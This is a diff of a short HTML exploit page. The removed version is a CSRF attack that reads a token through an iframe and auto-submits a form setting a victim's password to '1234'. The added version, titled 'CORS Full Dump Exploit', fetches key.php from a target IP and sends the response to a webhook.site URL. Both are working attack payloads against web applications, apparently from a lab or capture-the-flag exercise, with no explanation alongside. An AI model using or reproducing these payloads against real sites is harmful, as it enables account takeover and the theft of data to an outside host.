@@ -1,23 +1,16 @@
+<!DOCTYPE html>
 <html>
+<head>
+  <title>CORS Full Dump Exploit</title>
+</head>
 <body>
-<iframe id="f" src="http://34.124.182.137/changepassword.php"></iframe>
-<script>
-document.getElementById('f').onload = function() {
-    let token = this.contentDocument.querySelector('#csrftoken').value;
-
-    let form = document.createElement('form');
-    form.method = 'POST';
-    form.action = 'http://34.124.182.137/save_profile.php';
-
-    form.innerHTML = `
-        <input type="hidden" name="password" value="1234">
-        <input type="hidden" name="cpassword" value="1234">
-        <input type="hidden" name="csrf_token" value="${token}">
-    `;
-
-    document.body.appendChild(form);
-    form.submit();
-};
-</script>
+  <h1>CORS Exploit Running...</h1>
+  <script>
+    fetch("http://34.126.93.33/key.php")
+    .then(res => res.text())
+    .then(data => {
+      fetch("https://webhook.site/b7423942-9f41-412d-9709-593fabe33f64/" + encodeURIComponent(data));
+    });
+  </script>
 </body>
 </html>
